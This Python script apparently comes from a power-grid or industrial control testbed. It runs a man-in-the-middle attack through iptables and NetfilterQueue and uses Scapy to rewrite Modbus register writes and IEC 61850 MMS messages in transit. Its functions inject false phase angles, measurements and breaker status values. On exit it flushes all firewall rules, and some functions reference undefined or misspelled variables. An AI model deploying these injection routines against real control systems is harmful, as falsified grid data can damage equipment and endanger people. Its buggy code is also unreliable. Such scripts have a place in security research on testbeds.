from scapy.all import *
import scapy.contrib.modbus as mb
from netfilterqueue import NetfilterQueue
import os
from utils_modified import *
iptablesr1 = "iptables -A FORWARD -p tcp -j NFQUEUE --queue-num 0"
from scapy.contrib.modbus import * 

import struct
from ieee754 import IEEE754

print("Adding iptable rules :")
print(iptablesr1)
os.system(iptablesr1)
#os.system(iptablesr2)
lastestTargetInvokedId = 0
lastestTargetInvokedId1 = 0
lastestTargetInvokedId2 = 0
value = b'\x41\x20\x00\x00' #10 in floating point, IEEE 754 standard

def callback(payload):
    #print ("callback")
    data = payload.get_payload()
    pkt = IP(data)
    finalpkt = handle_received_packets(pkt)
    print("callback:")
    try:
        hexdump(finalpkt)
        payload.set_payload(bytes(finalpkt))
    except Exception as e:
        pass
    payload.accept()

def tda1(pkt):
    if (pkt["IP"].src == "172.16.4.41"  and pkt["IP"].dst == "172.16.5.11"): 
        if pkt.haslayer("ModbusPDU10WriteMultipleRegistersRequest"):
            print ("handle splc_vsd1_speed")
            print("Before:")
            hexdump(pkt)
            final_pkt = pkt.copy()
            del final_pkt[IP].chksum
            del final_pkt[TCP].chksum
            final_pkt["ModbusPDU10WriteMultipleRegistersRequest"].outputsValue = [0x0106, 0x1d4c]
            print("After:")
            hexdump(final_pkt)
        return final_pkt
    return pkt

def fdia1(pkt):
    global lastestTargetInvokedId
    #pkt.show()
    if ((pkt["IP"].src == "172.18.5.60"  and pkt["IP"].dst == "172.16.4.41") or 
       (pkt["IP"].src == "172.16.4.41"  and pkt["IP"].dst == "172.18.5.60")): 
        print ("---------------------------------------------------------------------------------------")
        print(pkt['IP'].src, pkt['IP'].dst)
        print (result)                 
        try:
            if result["isvalid"] == True and result["invokeid"] >= 0 and result["isfragment"] == False:
                if result["isrequest"] == True:
                    #print ("print ----")
                    lastestTargetInvokedKey = str(result["querykey"])
                    if  "GGIO17$CO$SPCSO2$Oper" in str(result["datafield"]): #and "ServerLogicalDevice" in str(result["datafield"]):
                        lastestTargetInvokedId = result["invokeid"]
                        print ("lastestTargetInvokedId " + str(lastestTargetInvokedId))
                        final_pkt = pkt.copy()
                        payload = final_pkt["Raw"]
                        print("Before:")
                        hexdump(final_pkt)
                        dataoffset = -102
                        final_pkt["Raw"].load = payload.load[:dataoffset] + b'\x00' + payload.load[dataoffset+1:]
                        del final_pkt[IP].chksum
                        del final_pkt[TCP].chksum
                        print("After:")
                        hexdump(final_pkt)
                        return final_pkt
                elif lastestTargetInvokedId == result["invokeid"]:
                    return pkt
        except Exception as e:
            return pkt
    return pkt

def fdia2(pkt):
    global lastestTargetInvokedId
    if ((pkt["IP"].src == "172.18.5.60"  and pkt["IP"].dst == "172.16.3.12") or 
       (pkt["IP"].src == "172.16.3.12"  and pkt["IP"].dst == "172.18.5.60")): 
        print ("---------------------------------------------------------------------------------------")
        print(pkt['IP'].src, pkt['IP'].dst)
        result = check_mms(pkt) 
        print (result)                 
        try:
            if result["isvalid"] == True and result["invokeid"] >= 0 and result["isfragment"] == False:
                if result["isrequest"] == True:
                    #print ("print ----")
                    lastestTargetInvokedKey = str(result["querykey"])
                    if  "LLN0$Measurement" in str(result["datafield"]) and "MIED2PROT" in str(result["datafield"]):
                        lastestTargetInvokedId = result["invokeid"]
                        print ("lastestTargetInvokedId " + str(lastestTargetInvokedId))
                elif lastestTargetInvokedId == result["invokeid"]:
                    print ("find the correct response")
                    final_pkt = pkt.copy() 
                    payload = final_pkt["Raw"]
                    if payload is not None:
                        print("Before:")
                        hexdump(final_pkt)
                        final_pkt["Raw"].load = payload.load[:-18] + b'\xc0\xc0\x00\x00' + payload.load[-14:] #set phase angle to 30.0
                        del final_pkt[IP].chksum
                        del final_pkt[TCP].chksum
                        print("After:")
                        hexdump(final_pkt)
                    return final_pkt
        except Exception as e:
            return pkt
    return pkt

def fdia3(pkt):
    global lastestTargetInvokedId1
    global lastestTargetInvokedId2
    print("am here")
    if ((pkt["IP"].src == "172.16.4.41" and pkt["IP"].dst == "172.16.3.12") or 
       (pkt["IP"].src == "172.16.3.12" and pkt["IP"].dst == "172.16.4.41")): 
        print("am here 2")
        print ("---------------------------------------------------------------------------------------")
        print(pkt['IP'].src, pkt['IP'].dst)
        result = check_mms(pkt) 
        print (result)                 
        try:
            if result["isvalid"] == True and result["invokeid"] >= 0 and result["isfragment"] == False:
                if result["isrequest"] == True:
                    print("got here?")
                    lastestTargetInvokedKey = str(result["querykey"])
                    print(lastestTargetInvokedKey)
                    print(result["datafield"])
                    if  "GGIO1$ST$Ind5$stVal" in str(result["datafield"]) and "MIED2CTRL" in str(result["datafield"]):
                        lastestTargetInvokedId1 = result["invokeid"]
                        print ("lastestTargetInvokedId " + str(lastestTargetInvokedId1))
                elif lastestTargetInvokedId1 == result["invokeid"]:
                    print ("find the correct response")
                    final_pkt = pkt.copy() 
                    payload = final_pkt["Raw"]
                    if payload is not None:
                        print("Before:")
                        hexdump(final_pkt)
                        final_pkt["Raw"].load = payload.load[:-1] + b'\x00'
                        del final_pkt[IP].chksum
                        del final_pkt[TCP].chksum
                        print("After:")
                        hexdump(final_pkt)
                    return final_pkt
        except Exception as e:
            return pkt
    elif ((pkt["IP"].src == "172.16.4.41" and pkt["IP"].dst == "172.16.3.11") or 
       (pkt["IP"].src == "172.16.3.11" and pkt["IP"].dst == "172.16.4.41")): 
        print("am here 2")
        print ("---------------------------------------------------------------------------------------")
        print(pkt['IP'].src, pkt['IP'].dst)
        result = check_mms(pkt) 
        print (result)                 
        try:
            if result["isvalid"] == True and result["invokeid"] >= 0 and result["isfragment"] == False:
                if result["isrequest"] == True:
                    lastestTargetInvokedKey = str(result["querykey"])
                    print(lastestTargetInvokedKey)
                    print(result["datafield"])
                    if "GGIO1$ST$Ind5$stVal" in str(result["datafield"]) and "MIED1CTRL" in str(result["datafield"]):
                        lastestTargetInvokedId2 = result["invokeid"]
                        print ("lastestTargetInvokedId " + str(lastestTargetInvokedId2))
                elif lastestTargetInvokedId2 == result["invokeid"]:
                    print ("find the correct response")
                    final_pkt = pkt.copy() 
                    payload = final_pkt["Raw"]
                    if payload is not None:
                        print("Before:")
                        hexdump(final_pkt)
                        final_pkt["Raw"].load = payload.load[:-1] + b'\x00'
                        del final_pkt[IP].chksum
                        del final_pkt[TCP].chksum
                        print("After:")
                        hexdump(final_pkt)
                    return final_pkt
        except Exception as e:
            return pkt
    return pkt 

def fdia4_1(pkt):
    global lastestTargetInvokedId
    print("am here")
    if ((pkt["IP"].src == "172.16.4.41" and pkt["IP"].dst == "172.16.3.12") or 
       (pkt["IP"].src == "172.16.3.12" and pkt["IP"].dst == "172.16.4.41")): 
        print("am here 2")
        print ("---------------------------------------------------------------------------------------")
        print(pkt['IP'].src, pkt['IP'].dst)
        result = check_mms(pkt) 
        print (result)                 
        try:
            if result["isvalid"] == True and result["invokeid"] >= 0 and result["isfragment"] == False:
                if result["isrequest"] == True:
                    lastestTargetInvokedKey = str(result["querykey"])
                    print(lastestTargetInvokedKey)
                    print(result["datafield"])
                    if  "GGIO1$ST$Ind5$stVal" in lastestTargetInvokedKey and "MIED2CTRL" in str(result["datafield"]):
                        lastestTargetInvokedId = result["invokeid"]
                        print ("lastestTargetInvokedId " + str(lastestTargetInvokedId))
                elif lastestTargetInvokedId == result["invokeid"]:
                    print ("find the correct response")
                    final_pkt = pkt.copy() 
                    payload = final_pkt["Raw"]
                    if payload is not None:
                        print("Before:")
                        hexdump(final_pkt)
                        final_pkt["Raw"].load = payload.load[:-1] + b'\x01'
                        del final_pkt[IP].chksum
                        del final_pkt[TCP].chksum
                        print("After:")
                        hexdump(final_pkt)
                        return final_pkt
        except Exception as e:
            return pkt
    return pkt

#for fdia4, run fdia4_1 first to set GEN1_P_Negative to True and then run this 
def fdia4_2(pkt):
    if ((pkt["IP"].src == "172.16.4.41" and pkt["IP"].dst == "172.16.5.11") or 
       (pkt["IP"].src == "172.16.5.11" and pkt["IP"].dst == "172.16.4.41")): 
        print ("---------------------------------------------------------------------------------------")
        print(pkt['IP'].src, pkt['IP'].dst)
        final_pkt = pkt.copy()
        del final_pkt[IP].chksum
        del final_pkt[TCP].chksum
        if final_pkt.haslayer("ModbusPDU10WriteMultipleRegistersRequest"):
           print("Before:")
           hexdump(final_pkt)
           final_pkt["ModbusPDU10WriteMultipleRegistersRequest"].outputsValue = [0x0106, 0x1d4c]
           print("After:")
           hexdump(final_pkt)
           return final_pkt
    return pkt

def tda2(pkt):
    if ((pkt["IP"].src == "172.16.4.41" and pkt["IP"].dst == "172.16.5.11") or 
       (pkt["IP"].src == "172.16.5.11" and pkt["IP"].dst == "172.16.4.41")): 
        print ("---------------------------------------------------------------------------------------")
        print(pkt['IP'].src, pkt['IP'].dst)
        final_pkt = pkt.copy()
        del final_pkt[IP].chksum
        del final_pkt[TCP].chksum
        if final_pkt.haslayer("ModbusPDU10WriteMultipleRegistersRequest"):
           print("Before:")
           hexdump(final_pkt)
           final_pkt["ModbusPDU10WriteMultipleRegistersRequest"].outputsValue = [0x0106, 0x1d4c]
           print("After:")
           hexdump(final_pkt)
           return final_pkt
    return pkt


def fdia5(pkt):
    global lastestTargetInvokedId
    if ((pkt["IP"].src == "172.16.4.41" and pkt["IP"].dst == "172.18.5.60") or 
       (pkt["IP"].src == "172.18.5.60" and pkt["IP"].dst == "172.16.4.41")): 
        print ("---------------------------------------------------------------------------------------")
        print(pkt['IP'].src, pkt['IP'].dst)
        result = check_mms(pkt) 
        print (result)                 
        try:
            if result["isvalid"] == True and result["invokeid"] >= 0 and result["isfragment"] == False:
                if result["isrequest"] == True:
                    #print ("print ----")
                    lastestTargetInvokedKey = str(result["querykey"])
                    if  "GGIO24$SV$AnIn1$subMag$f" in str(result["datafield"]):
                        lastestTargetInvokedId = result["invokeid"]
                        print ("lastestTargetInvokedId " + str(lastestTargetInvokedId))
                        final_pkt = pkt.copy()
                        payload = final_pkt["Raw"]
                        print("Before:")
                        hexdump(final_pkt)
                        current_value = payload.load[-4:]
                        current_value_float = struct.unpack('>f', current_value)[0]
                        new_value_float = 100.0 - current_value_float
                        new_value_1 = IEEE754(new_value_float, 1)
                        new_value = bytes.fromhex(new_value_1.str2hex())
                        final_pkt["Raw"].load = payload.load[:-4] + new_value
                        del final_pkt[IP].chksum
                        del final_pkt[TCP].chksum
                        print("After:")
                        hexdump(final_pkt)
                        return final_pkt
                elif lastestTargetInvokedId == result["invokeid"]:
                    return pkt
        except Exception as e:
            print(e)
            return pkt
    return pkt

def handle_received_packets(pkt):
    global lastestTargetInvokedId

    final_pkt = pkt
    print ("-----------------------------------------------------")
    try:
        #comment out attack to carry out and comment everything else
        if final_pkt.haslayer("TCP"):
            final_pkt = fdia1(pkt)
            #final_pkt = fdia2(pkt)
            #final_pkt = tda1(pkt)
            #final_pkt = fdia4_1(pkt)
            #final_pjt = fdia4_2(pkt)
            #final_pkt = fdia3(pkt)
            #final_pkt = tda2(pkt)
            #final_pkt = fdia5(pkt)
            print("handle_received_packets:")
            hexdump(final_pkt)
        #final_pkt.show()   
    except Exception as e:
        pass
    return final_pkt


def main():
    q = NetfilterQueue()
    q.bind(0, callback)
    try:
        print ("[*] waiting for data")
        q.run() # Main loop
    except KeyboardInterrupt:
        print('')
        q.unbind()
        os.system('iptables -D FORWARD -p tcp -j NFQUEUE --queue-num 0')
        os.system('iptables -F')
        os.system('iptables -X')
        sys.exit('closing...')
main()

